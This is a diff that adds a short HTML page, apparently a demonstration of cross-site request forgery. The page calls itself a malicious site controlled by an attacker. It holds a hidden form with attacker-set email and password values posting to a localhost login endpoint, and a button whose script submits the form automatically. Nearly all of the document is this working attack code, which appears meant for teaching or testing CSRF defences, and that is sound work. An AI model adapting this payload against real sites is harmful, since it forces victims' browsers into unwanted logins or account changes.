@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sample CSRF Vulnerable Page</title>
+</head>
+<body>
+    <h1>Update Profile</h1>
+    <form id="updateForm" action="http://localhost:8080/login" method="POST">
+     
+        <input type="hidden" name="email" value="hacker1@example.com">
+        <input type="hidden" name="password" value="456">
+        <input type="submit" value="Login">
+    </form>
+
+    <h2>Malicious Website</h2>
+    <p>This is a malicious website controlled by an attacker.</p>
+    <p>Click the following button to perform a CSRF attack:</p>
+    <button onclick="submitCSRF()">Perform CSRF Attack</button>
+
+    <script>
+        function submitCSRF() {
+            // Submitting the form programmatically
+            document.getElementById("updateForm").submit();
+        }
+    </script>
+</body>
+</html>
